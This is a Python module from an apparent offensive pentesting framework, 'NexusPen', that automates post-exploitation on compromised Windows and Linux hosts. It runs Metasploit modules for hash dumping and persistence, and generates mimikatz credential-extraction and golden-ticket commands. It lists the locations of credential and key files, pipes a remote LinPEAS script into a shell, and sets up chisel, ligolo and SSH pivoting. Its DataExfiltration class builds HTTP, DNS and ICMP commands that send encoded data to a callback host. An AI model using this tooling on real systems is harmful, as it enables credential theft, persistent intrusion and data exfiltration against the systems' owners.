#!/usr/bin/env python3
"""
NexusPen - Post Exploitation Module
====================================
Post-exploitation techniques and persistence.
"""

import subprocess
import base64
from typing import Dict, List, Optional
from dataclasses import dataclass

from rich.console import Console
from rich.table import Table

console = Console()


@dataclass
class PostExploitResult:
    """Post-exploitation action result."""
    action: str
    success: bool
    data: Optional[Dict] = None
    error: Optional[str] = None


class WindowsPostExploit:
    """
    Windows post-exploitation techniques.
    """
    
    # Meterpreter post modules
    POST_MODULES = {
        'hashdump': 'post/windows/gather/hashdump',
        'lsa_secrets': 'post/windows/gather/lsa_secrets',
        'credentials': 'post/windows/gather/credentials/credential_collector',
        'mimikatz': 'post/windows/gather/smart_hashdump',
        'enum_users': 'post/windows/gather/enum_logged_on_users',
        'enum_shares': 'post/windows/gather/enum_shares',
        'enum_apps': 'post/windows/gather/enum_applications',
        'enum_patches': 'post/windows/gather/enum_patches',
        'arp_scanner': 'post/windows/gather/arp_scanner',
        'local_exploit_suggester': 'post/multi/recon/local_exploit_suggester',
        'persistence': 'exploit/windows/local/persistence_service',
        'getsystem': 'post/windows/escalate/getsystem',
    }
    
    def __init__(self, session_id: str):
        self.session_id = session_id
    
    def run_module(self, module: str, options: Dict = None) -> PostExploitResult:
        """Run a Metasploit post module."""
        console.print(f"\n[cyan]ðŸ”§ Running: {module}[/cyan]")
        
        result = PostExploitResult(action=module, success=False)
        
        rc_commands = [
            f"use {module}",
            f"set SESSION {self.session_id}",
        ]
        
        if options:
            for key, value in options.items():
                rc_commands.append(f"set {key} {value}")
        
        rc_commands.append("run")
        
        rc_file = '/tmp/nexuspen_post.rc'
        with open(rc_file, 'w') as f:
            f.write('\n'.join(rc_commands))
        
        try:
            proc = subprocess.run(
                ['msfconsole', '-q', '-r', rc_file],
                capture_output=True, text=True, timeout=120
            )
            
            result.success = True
            result.data = {'output': proc.stdout}
            console.print("[green]âœ“ Module completed[/green]")
            
        except Exception as e:
            result.error = str(e)
        
        return result
    
    def hashdump(self) -> PostExploitResult:
        """Dump Windows password hashes."""
        return self.run_module(self.POST_MODULES['hashdump'])
    
    def lsa_secrets(self) -> PostExploitResult:
        """Dump LSA secrets."""
        return self.run_module(self.POST_MODULES['lsa_secrets'])
    
    def mimikatz_all(self) -> str:
        """Generate mimikatz command for full credential extraction."""
        return """
# Run in meterpreter:
load kiwi
creds_all
lsa_dump_secrets
golden_ticket_create -d DOMAIN -k KRBTGT_HASH -u Administrator -s SID
"""
    
    def suggest_exploits(self) -> PostExploitResult:
        """Run local exploit suggester."""
        return self.run_module(self.POST_MODULES['local_exploit_suggester'])
    
    def establish_persistence(self, method: str = 'service') -> PostExploitResult:
        """Establish persistence."""
        methods = {
            'service': 'exploit/windows/local/persistence_service',
            'registry': 'exploit/windows/local/persistence',
            'scheduled_task': 'post/windows/manage/schtaskbat',
            'wmi': 'post/windows/manage/wmi_persistence',
        }
        
        module = methods.get(method, methods['service'])
        return self.run_module(module)
    
    def dump_credentials(self) -> List[str]:
        """Return commands for credential dumping."""
        return [
            "# Meterpreter commands:",
            "hashdump",
            "load kiwi",
            "creds_all",
            "lsa_dump_sam",
            "lsa_dump_secrets",
            "",
            "# Mimikatz (on target):",
            "mimikatz.exe privilege::debug sekurlsa::logonpasswords exit",
            "",
            "# Secretsdump (remote):",
            f"secretsdump.py DOMAIN/user:password@TARGET",
        ]


class LinuxPostExploit:
    """
    Linux post-exploitation techniques.
    """
    
    POST_MODULES = {
        'hashdump': 'post/linux/gather/hashdump',
        'enum_system': 'post/linux/gather/enum_system',
        'enum_users': 'post/linux/gather/enum_users_history',
        'enum_configs': 'post/linux/gather/enum_configs',
        'checkvm': 'post/linux/gather/checkvm',
        'enum_protections': 'post/linux/gather/enum_protections',
        'ssh_creds': 'post/multi/gather/ssh_creds',
        'docker': 'post/linux/gather/enum_containers',
    }
    
    PRIVESC_CHECKS = {
        'suid': "find / -perm -4000 -type f 2>/dev/null",
        'capabilities': "getcap -r / 2>/dev/null",
        'writable_passwd': "ls -la /etc/passwd /etc/shadow 2>/dev/null",
        'sudo_nopasswd': "sudo -l 2>/dev/null",
        'cron': "cat /etc/crontab; ls -la /etc/cron.d/",
        'docker_group': "id | grep docker",
        'kernel_version': "uname -a",
        'os_release': "cat /etc/os-release",
    }
    
    def __init__(self, session_id: str = None):
        self.session_id = session_id
    
    def run_module(self, module: str, options: Dict = None) -> PostExploitResult:
        """Run a Metasploit post module."""
        console.print(f"\n[cyan]ðŸ”§ Running: {module}[/cyan]")
        
        result = PostExploitResult(action=module, success=False)
        
        if not self.session_id:
            result.error = "No session ID provided"
            return result
        
        # Similar to Windows implementation
        return result
    
    def generate_privesc_script(self) -> str:
        """Generate Linux privilege escalation enumeration script."""
        script = """#!/bin/bash
echo "=== Linux Privilege Escalation Enumeration ==="

echo -e "\\n[+] System Info"
uname -a
cat /etc/os-release 2>/dev/null

echo -e "\\n[+] Current User"
id
sudo -l 2>/dev/null

echo -e "\\n[+] SUID Binaries"
find / -perm -4000 -type f 2>/dev/null

echo -e "\\n[+] Capabilities"
getcap -r / 2>/dev/null

echo -e "\\n[+] Writable Directories"
find / -writable -type d 2>/dev/null | head -20

echo -e "\\n[+] Cron Jobs"
cat /etc/crontab 2>/dev/null
ls -la /etc/cron.* 2>/dev/null

echo -e "\\n[+] Running Processes"
ps aux | grep -v "\\["

echo -e "\\n[+] Network Connections"
netstat -tulpn 2>/dev/null || ss -tulpn

echo -e "\\n[+] Interesting Files"
find /home -name "*.txt" -o -name "*.conf" -o -name "*.sh" 2>/dev/null

echo -e "\\n[+] SSH Keys"
find / -name "id_rsa" -o -name "id_dsa" 2>/dev/null

echo -e "\\n[+] Password Files"
ls -la /etc/passwd /etc/shadow 2>/dev/null
cat /etc/passwd

echo -e "\\n[+] Docker Check"
docker ps 2>/dev/null && echo "Docker available!"
"""
        return script
    
    def linpeas_command(self) -> str:
        """Return command to run LinPEAS."""
        return "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh"
    
    def pspy_command(self) -> str:
        """Return command to run pspy for process monitoring."""
        return "curl -L https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64 -o pspy && chmod +x pspy && ./pspy"


class CredentialHarvester:
    """
    Multi-platform credential harvesting.
    """
    
    @staticmethod
    def windows_credentials() -> List[str]:
        """Return Windows credential locations."""
        return [
            # SAM Database
            "C:\\Windows\\System32\\config\\SAM",
            "C:\\Windows\\System32\\config\\SYSTEM",
            "C:\\Windows\\System32\\config\\SECURITY",
            
            # Browser credentials
            "%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Login Data",
            "%APPDATA%\\Mozilla\\Firefox\\Profiles\\*.default\\logins.json",
            "%LOCALAPPDATA%\\Microsoft\\Edge\\User Data\\Default\\Login Data",
            
            # Other
            "%USERPROFILE%\\.ssh\\id_rsa",
            "%USERPROFILE%\\.aws\\credentials",
            "%USERPROFILE%\\.azure\\accessTokens.json",
            "C:\\Users\\*\\AppData\\Local\\Packages\\*CanonicalGroupLimited*\\LocalState\\rootfs\\etc\\shadow",
        ]
    
    @staticmethod
    def linux_credentials() -> List[str]:
        """Return Linux credential locations."""
        return [
            "/etc/shadow",
            "/etc/passwd",
            "/home/*/.ssh/id_rsa",
            "/home/*/.ssh/id_dsa",
            "/home/*/.ssh/id_ecdsa",
            "/home/*/.gnupg/*",
            "/home/*/.aws/credentials",
            "/home/*/.azure/accessTokens.json",
            "/var/lib/mysql/mysql.user",
            "/root/.ssh/id_rsa",
            "/root/.bash_history",
            "/home/*/.bash_history",
            "/var/log/auth.log",
            "/var/log/secure",
        ]
    
    @staticmethod
    def web_credentials() -> List[str]:
        """Return common web app credential locations."""
        return [
            # WordPress
            "/var/www/html/wp-config.php",
            
            # Joomla
            "/var/www/html/configuration.php",
            
            # Drupal
            "/var/www/html/sites/default/settings.php",
            
            # Laravel
            "/var/www/html/.env",
            
            # Django
            "/var/www/html/settings.py",
            
            # Database configs
            "/etc/mysql/my.cnf",
            "/var/lib/pgsql/data/pg_hba.conf",
            "/etc/mongodb.conf",
        ]


class PivotingTools:
    """
    Network pivoting utilities.
    """
    
    @staticmethod
    def chisel_commands(lhost: str, lport: int) -> Dict[str, str]:
        """Generate chisel tunneling commands."""
        return {
            'server': f"./chisel server -p {lport} --reverse",
            'client_socks': f"./chisel client {lhost}:{lport} R:socks",
            'client_port': f"./chisel client {lhost}:{lport} R:8888:127.0.0.1:8080",
        }
    
    @staticmethod
    def ligolo_commands(lhost: str) -> Dict[str, str]:
        """Generate ligolo-ng tunneling commands."""
        return {
            'proxy': f"./ligolo-proxy -selfcert -laddr 0.0.0.0:11601",
            'agent': f"./ligolo-agent -connect {lhost}:11601 -ignore-cert",
        }
    
    @staticmethod
    def ssh_tunnels(ssh_host: str, ssh_user: str) -> Dict[str, str]:
        """Generate SSH tunnel commands."""
        return {
            'local_forward': f"ssh -L 8080:internal:80 {ssh_user}@{ssh_host}",
            'remote_forward': f"ssh -R 8080:localhost:80 {ssh_user}@{ssh_host}",
            'dynamic_socks': f"ssh -D 1080 {ssh_user}@{ssh_host}",
        }
    
    @staticmethod
    def proxychains_config(socks_host: str, socks_port: int) -> str:
        """Generate proxychains configuration."""
        return f"""# /etc/proxychains.conf
strict_chain
proxy_dns
[ProxyList]
socks5 {socks_host} {socks_port}
"""
    
    @staticmethod
    def metasploit_pivot(session_id: str, subnet: str) -> str:
        """Generate Metasploit pivot commands."""
        return f"""
# Add route through meterpreter session
route add {subnet} 255.255.255.0 {session_id}

# Or use autoroute
use post/multi/manage/autoroute
set SESSION {session_id}
set SUBNET {subnet}
run

# Start SOCKS proxy
use auxiliary/server/socks_proxy
set SRVPORT 1080
run -j
"""


class DataExfiltration:
    """
    Data exfiltration techniques.
    """
    
    @staticmethod
    def http_exfil(data: str, callback_url: str) -> str:
        """Generate HTTP exfiltration command."""
        encoded = base64.b64encode(data.encode()).decode()
        return f"curl -X POST -d 'data={encoded}' {callback_url}"
    
    @staticmethod
    def dns_exfil(data: str, domain: str) -> str:
        """Generate DNS exfiltration commands."""
        return f"""
# Exfiltrate via DNS TXT queries
for chunk in $(echo "{data}" | base64 | fold -w63); do
    nslookup $chunk.{domain}
done
"""
    
    @staticmethod
    def icmp_exfil(data: str, target: str) -> str:
        """Generate ICMP exfiltration command."""
        return f"""
# Requires icmpsh or similar
# Data in ICMP payload
echo "{data}" | xxd -p | while read line; do ping -c 1 -p $line {target}; done
"""
    
    @staticmethod
    def smb_exfil(file: str, share: str) -> str:
        """Generate SMB exfiltration command."""
        return f"copy {file} {share}"
